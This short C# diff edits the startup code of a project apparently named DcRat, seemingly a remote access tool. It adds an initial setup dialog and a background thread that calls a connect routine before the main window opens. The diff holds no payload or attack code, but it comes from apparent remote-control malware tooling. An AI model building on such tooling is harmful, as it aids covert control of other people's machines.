@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -16,6 +17,14 @@ namespace DcRat
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
+            using (FormInit formInit = new FormInit())
+            {
+                formInit.ShowDialog();
+            }
+            new Thread(() =>
+            {
+                FormMain.Connect();
+            }).Start();
             Application.Run(new FormMain());
         }
     }
